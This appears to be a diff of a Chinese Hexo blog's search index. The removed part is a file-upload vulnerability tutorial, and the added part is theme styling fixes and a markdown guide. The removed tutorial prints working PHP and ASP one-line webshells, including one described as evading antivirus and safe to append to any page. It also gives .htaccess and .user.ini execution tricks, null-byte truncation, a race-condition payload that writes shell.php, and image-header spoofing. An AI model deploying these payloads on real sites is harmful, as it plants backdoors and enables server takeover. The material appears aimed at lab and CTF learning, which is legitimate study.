class="string">&#x27;r&#x27;</span>]` <span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST</span>[sb])&lt;/script&gt; <span class="comment">//绕过&lt;?限制的一句话</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> (])<span class="meta">?&gt;</span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]))&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);&#125;<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span> </span><br><span class="line">加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</span><br><span class="line"></span><br><span class="line">&lt;%execute <span class="title function_ invoke__">request</span>(“<span class="keyword">class</span>”)%&gt;&lt;%<span class="string">&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;</span>&lt;% loop &lt;%:%&gt;&lt;%execute <span class="title function_ invoke__">request</span> (“<span class="keyword">class</span>”)%&gt;&lt;%execute <span class="title function_ invoke__">request</span>(“<span class="keyword">class</span>”)<span class="string">&#x27;&lt;% loop &lt;%:%&gt; </span></span><br><span class="line"><span class="string">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;%eval(request(“1″)):response.end%&gt; 备份专用</span></span><br></pre></td></tr></table></figure>
+<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>打开文件 “&#x2F;themes&#x2F;next&#x2F;source&#x2F;css&#x2F;_variables&#x2F;Gemini.styl”，<br>在</p>
+<pre><code>// Settings for some of the most global styles.
+// --------------------------------------------------
+// $body-bg-color           = #eee;
+$body-bg-color           = transparent;
 
-<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;form enctype<span class="operator">=</span><span class="string">&quot;multipart/form-data&quot;</span> method<span class="operator">=</span><span class="string">&quot;post&quot;</span> onsubmit<span class="operator">=</span><span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">             &lt;p&gt;请选择要上传的图片：&lt;/p&gt;&lt;p&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;input_file&quot;</span> type<span class="operator">=</span><span class="string">&quot;file&quot;</span> name<span class="operator">=</span><span class="string">&quot;upload_file&quot;</span>&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;button&quot;</span> type<span class="operator">=</span><span class="string">&quot;submit&quot;</span> name<span class="operator">=</span><span class="string">&quot;submit&quot;</span> value<span class="operator">=</span><span class="string">&quot;上传&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">         &lt;/form&gt;</span><br></pre></td></tr></table></figure>
-<p>表单中使用onsumbit&#x3D;”return checkFile()”调用js函数来检查上传文件的扩展名。当用户在<strong>客户端</strong>选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为<strong>前台脚本检测扩展名</strong>。</p>
-<p><strong>绕过方法</strong>：<br>1、在浏览器中审查元素，删除检测函数<br>2、通过改包软件将修改后缀名再上传<br>3、浏览器安装插件禁用JS<br><br></p>
-<h2 id="后端验证"><a href="#后端验证" class="headerlink" title="后端验证"></a>后端验证</h2><p>在文件被上传到<strong>服务端</strong>的时候，对文件内容、大小和类型进行检测等。</p>
-<h3 id="基于MIME-文件类型检测"><a href="#基于MIME-文件类型检测" class="headerlink" title="基于MIME(文件类型检测)"></a>基于MIME(文件类型检测)</h3><p><strong>常见类型</strong>：<br><img src="/posts/154257042/1.png"></p>
-<p><strong>绕过方法</strong>：<br>使用工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为对应的类型。</p>
-<h3 id="基于后缀"><a href="#基于后缀" class="headerlink" title="基于后缀"></a>基于后缀</h3><p>通过检查文件的扩展名来确定文件<strong>类型</strong>，如果扩展名与允许上传的类型匹配，则系统允许上传；否则，系统可能会拒绝上传或发出警告。</p>
-<p>（虽然一般不会考这么简单，但试试也行）可以尝试改成 <code>php3/4/5/6/7/phps/pht/phpm/phtml</code><br><br></p>
-<h4 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h4><p>文件扩展名在黑名单中的为不合法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_blacklisted</span>(<span class="params">filename</span>):</span><br><span class="line">    blacklisted_extensions = [<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;.bat&#x27;</span>, <span class="string">&#x27;.cmd&#x27;</span>, <span class="string">&#x27;.sh&#x27;</span>]  <span class="comment"># 黑名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含黑名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> blacklisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以黑名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含黑名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_blacklisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型在黑名单中。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>黑名单的绕过方法</strong>在这里简单概括一下，后面会有较为详细的解释。<br><strong>Windows系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、大小写绕过<br>3、双写绕过<br>4、末尾添加.绕过<br>5、末尾添加空格绕过<br>6、末尾添加::$DATA绕过<br>7、截断上传<br>8、竞争上传<br>9、.htaccess文件上传<br>10、上传图片马结合文件包含  </p>
-<p><strong>Linux系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、双写绕过<br>3、截断上传<br>4、竞争上传<br>5、.htaccess文件上传<br>6、上传图片马结合文件包含</p>
-<h4 id="白名单验证"><a href="#白名单验证" class="headerlink" title="白名单验证"></a>白名单验证</h4><p>文件扩展名不在白名单中的均为不合法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_whitelisted</span>(<span class="params">filename</span>):</span><br><span class="line">    whitelisted_extensions = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>]  <span class="comment"># 白名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含白名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> whitelisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以白名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含白名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.jpg&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_whitelisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型不在白名单中。&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>白名单的绕过方法</strong>简单概括：<br>1、结合解析漏洞<br>2、截断上传<br>3、文件名长度绕过<br>4、.htaccess文件上传<br>5、上传zip马结合文件包含</p>
-<h4 id="配置文件上传-htaccess-user-ini"><a href="#配置文件上传-htaccess-user-ini" class="headerlink" title="配置文件上传(.htaccess &#x2F; .user.ini)"></a>配置文件上传(.htaccess &#x2F; .user.ini)</h4><p><code>.htaccess：</code><br>.htaccess是Apache Web服务器上的一个配置文件，用于配置服务器的行为，如URL重写、访问控制、重定向等。<br>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>
-<p>但.htaccess文件可用的前提是管理员在http.conf文件中设置 AllowOverried All。<br><img src="/posts/154257042/5.png"></p>
-<p>如果代码没有对htaccess进行过滤，那么可以直接上传.htaccess来设置使用php解析任意文件。<br>创建txt文件输入以下代码，然后改为1.jpg,上传时抓包将filename改回.htaccess即可</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">&quot;\.jpg&quot;</span>为要上传的shell的文件名</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt; </span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;<span class="string">/FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>上传成功后再将图片马上传就可以连接蚁剑了</p>
-<p>更多关于.htaccess的操作可以看<br>Y4tacker<br>的<a href="https://blog.csdn.net/solitudi/article/details/116666720%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E8%AF%A6%E7%BB%86%E3%80%82">https://blog.csdn.net/solitudi/article/details/116666720，写的很详细。</a></p>
-<p><strong>局限:</strong><br>.htaccess的配置文件只能在Apache服务器中起作用<br>下面介绍另一个配置文件</p>
-<hr>
-
-<p><code>.user.ini</code><br>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a                  <span class="comment">//绕过exif_imagetype()</span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=<span class="number">1.</span>jpg <span class="comment">//指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span></span><br><span class="line"><span class="built_in">auto</span>_append_file=<span class="number">1.</span>jpg  <span class="comment">//解析后进行包含，它包含在所有php文件执行后执行</span></span><br></pre></td></tr></table></figure>
-<p>假设某网站限制上传php文件，但是可以上传.user.ini，在上传一个图片马，然后可以通过访问含有.user.ini的文件夹下的php文件进行连接蚁剑。</p>
-<h4 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h4><p>首先明确php中00截断的条件：<br>1、php版本小于5.3.29<br>2、magic_quotes_gpc &#x3D; Off  </p>
-<p>无论<strong>0x00</strong>还是**%00<strong>，最终被解析后都是chr（0），而chr（0）返回的就是一个空格，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。那么绕过是怎样发生的呢？<br>如：在通过抓包软件将文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，但是这样只能绕过前端验证，由于后端验证一般是通过文件上传路径来获取文件后缀的，直接截断是没有所以如果要绕过后端验证，则需要满足两个条件之一：<br>1、</strong>文件路径可控<strong>，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads&#x2F;，就可以直接把路径构造成uploads&#x2F;xxx.php%00<br>2、路径拼接直接</strong>使用 $file_name**这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的。</p>
-<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>条件竞争漏洞通常涉及到两个或多个操作：一个是文件的上传操作，另一个是对上传文件进行检查或删除的操作。<br>在某些情况下，这两个操作之间<strong>存在时间差</strong>，即上传操作完成后，检查或删除操作尚未执行。这段时间内，如果攻击者能够利用这个时间差来执行其他操作（如写入恶意脚本或代码），则可能导致严重的安全后果。</p>
-<p>接下来用一个例子进行讲解：</p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="language-php"><span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$uploaddir</span>))&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>);</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$allow_ext</span>))&#123;   <span class="comment">//如果文件是jpg或jpeg，那么可以保留并提示上传成功</span></span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);  <span class="comment">//为了实验更好的体现，程序暂停5秒之后才会删除文件</span></span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">exit</span>(<span class="variable">$uploaddir</span>.<span class="string">&#x27;文件夹不存在，请手工创建&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传漏洞演示--竞争上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>文件上传漏洞演示--竞争上传<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            请选择要上传的文件：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upfile&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p>从代码中可以看到，文件上传要是不符合要求，那么会在暂停5秒之后删除文件，在这5秒中，我们可以利用这个时间差来执行其他操作。<br>payload：<code>&lt;?php echo md5(1);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&quot;&lt;?php @eval($_POST[cmd])?&gt;&quot;);?&gt;</code></p>
-<p>上传php文件并抓包设置重放（使用null payloads）<br><img src="/posts/154257042/6.png"></p>
-<p>然后使用脚本不断地访问文件上传的地址，脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/upload/uploads/pl6.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:  <span class="comment">#判断shell.php是否写入成功</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>等到脚本返回200状态码则说明pl6.php执行成功并生成了shell.php，接下来使用蚁剑或者菜刀连接既可。<br><img src="/posts/154257042/7.png"></p>
-<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>文件上传二次渲染漏洞是指在文件上传功能中，服务器对上传的图片进行了<strong>二次处理</strong>（如格式、尺寸等），并且在处理完成后，将生成的新图片放置到网站对应的标签上显示。</p>
-<p>绕过方式分为三种：<strong>GIF绕过、PNG绕过、JPG绕过</strong>  </p>
-<p>1、GIF绕过二次渲染的方法，就是通过对比上传前和上传后的两个文件，如果说哪个位置，它的上传前和上传后的没有变，我们就把php一句话代码插入到这个位置。</p>
-<h4 id="结合解析漏洞（待补）"><a href="#结合解析漏洞（待补）" class="headerlink" title="结合解析漏洞（待补）"></a>结合解析漏洞（待补）</h4><h4 id="上传zip马结合文件包含"><a href="#上传zip马结合文件包含" class="headerlink" title="上传zip马结合文件包含"></a>上传zip马结合文件包含</h4><p>在白名单内只允许上传zip文件时，可以将php文件放入zip内，注意压缩方式为<strong>存储</strong>。<br><img src="/posts/154257042/3.png"></p>
-<p>在上传zip文件后，使用文件包含伪协议进行运行<br>zip:&#x2F;&#x2F; （压缩流）<br>phar:&#x2F;&#x2F; （PHP归档)<br>    <a href="http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo">http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo</a><br>    <a href="http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo">http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo</a><br>其中phpinfo.zip是所上传的压缩包，phpinfo是压缩包内的文件名，如果源代码中没有include <strong>php</strong>后缀的话，需要在伪协议代码后自行添加.php<br>如果include 的是jpg后缀，那么将压缩包内的文件也对应改成jpg即可<br><img src="/posts/154257042/4.png"></p>
-<h4 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h4><p><strong>1、上传图片马结合文件包含</strong><br>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。<br>假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;1.jpg,图片代码如下：<br><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[&#39;password&#39;]);?&gt;&quot;)?&gt;</code><br>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/1.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</p>
-<p><strong>2、大写绕过</strong>  </p>
-<p><strong>3、空格绕过</strong></p>
-<p><strong>4、后缀加.</strong></p>
-<p><strong>5、::$DATA绕过</strong></p>
-<p><strong>6、.空格.绕过</strong></p>
-<p><strong>7、双写后缀绕过</strong></p>
-<p><strong>8、字节标识绕过</strong></p>
-<p><strong>9、数组后缀绕过</strong></p>
-<br>
-
-
-<h3 id="基于文件内容（文件头检测）"><a href="#基于文件内容（文件头检测）" class="headerlink" title="基于文件内容（文件头检测）"></a>基于文件内容（文件头检测）</h3><p>利用每一个特定类型的文件都会有不一样的开头或者标志位进行检测。<br><strong>常见格式</strong>：<br><img src="/posts/154257042/2.png"><br><strong>绕过方法</strong>：<br>给上传脚本加上相应的幻数头字节就可以，php引擎会将GIF89a的内容当作html文本，不解释直接跳过，后面的代码仍然能够得到执行，如下：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<br>
-
-
+// Borders.
+// --------------------------------------------------
+$box-shadow-inner        = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12);
+$box-shadow              = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0,   0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12), 0 -1px .5px 0 rgba(0, 0, 0, .09);
+</code></pre>
+<p>中将 <code>$body-bg-color</code> 赋值为透明 transparent</p>
 ]]></content>
       <categories>
-        <category>web漏洞</category>
+        <category>hexo</category>
       </categories>
       <tags>
-        <tag>web攻防</tag>
-        <tag>web漏洞</tag>
+        <tag>hexo</tag>
+        <tag>next</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>next主题顶部黑边处理</title>
+    <url>/posts/937.html</url>
+    <content><![CDATA[<h1 id="next主题顶部黑边处理"><a href="#next主题顶部黑边处理" class="headerlink" title="next主题顶部黑边处理"></a>next主题顶部黑边处理</h1><p>问题描述：next主题优化后仍然有一条黑边在顶部出现</p>
+<span id="more"></span>
+<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>打开文件 “themes\next\layout_layout.swig” ,在 </p>
+<pre><code>&lt;body itemscope itemtype=&quot;http://schema.org/WebPage&quot;&gt;
+  &lt;div class=&quot;container&#123;%- if theme.motion.enable %&#125; use-motion&#123;%- endif %&#125;&quot;&gt;
+    &lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;
+</code></pre>
+<p>中删除 “<code>&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;</code>”</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>打开文件 “themes\next\source\css_variables\base.styl” ，<br>在</p>
+<pre><code>// Headband
+// --------------------------------------------------
+$headband-height                = 3px;
+$headband-bg                    = $black-deep;
+</code></pre>
+<p>中找到“<code>$headband-height</code>”，把3px改成0px；</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>next</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown基本语法</title>
+    <url>/posts/47caaf1e.html</url>
+    <content><![CDATA[<h1 id="markdown基本语法说明"><a href="#markdown基本语法说明" class="headerlink" title="markdown基本语法说明"></a>markdown基本语法说明</h1><span id="more"></span>
+
+<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在 Markdown 中，你可以通过在文字前面加上 # 来创建标题。# 的数量代表标题的级别。注意，#和标题之间要有一个空格 。例如：</p>
+<p># 一级标题</p>
+<p>## 二级标题</p>
+<p>### 三级标题</p>
+<p>#### 四级标题</p>
+<p>##### 五级标题</p>
+<p>###### 六级标题</p>
+<h2 id="段落和换行"><a href="#段落和换行" class="headerlink" title="段落和换行"></a>段落和换行</h2><p>普通的文本会被转换为段落，段落之间通过一个或多个空白行来分隔。</p>
+<p>如果你想要在不形成新段落的情况下进行换行（即在同一段落中换行），你可以在行尾添加两个或更多的空格然后回车。</p>
+<h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><p>你可以使用星号 * 或下划线 _ 来强调文本：</p>
+<p>斜体：<br>可以用一个 * 或 _ 包围文本来使其变为斜体。例如：<em>斜体</em> 或 _斜体_。</p>
+<p>粗体：<br>可以用两个 ** 或 __ 包围文本来使其变为粗体。例如：<strong>粗体</strong> 或 __粗体__。</p>
+<p>粗斜体：三个 *** 或 ___ 包围文本。例如：<em><strong>粗斜体</strong></em> 或 ___粗斜体___。</p>
+<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown 支持有序列表和无序列表。</p>
+<p>无序列表可以使用星号 *，加号 +，或是减号 - 作为列表标记。</p>
+<ul>
+<li>项目1</li>
+<li>项目2</li>
+<li>项目3</li>
+</ul>
+<p>有序列表直接使用数字接着一个英文句点 .。</p>
+<ol>
+<li>第一项</li>
+<li>第二项</li>
+<li>第三项</li>
+</ol>
+<h2 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h2><p>链接使用 <code>[链接文本](URL)</code> 的格式。例如：<a href="https://cn.bing.com/">Bing</a></p>
+<p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code> 的格式。<br>例如：<img src="https://pic2.zhimg.com/v2-5fb13110e1de13d4c11e6e7f5b8026da_r.jpg" alt="这是一张图片" title="just a example"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>行内代码使用单个反引号 <code> 包围。例如：</code>代码&#96;。</p>
+<p>代码块使用三个反引号`&#96;&#96;或四个空格缩进。例如：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">这是一个代码块</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>你可以使用三个以上的星号 ***、减号 — 或下划线 ___ 来创建一个水平分割线。</p>
+<hr>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用使用 &gt; 符号。例如：</p>
+<blockquote>
+<p>这是一个引用。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>markdown</tag>
       </tags>
   </entry>
 </search>
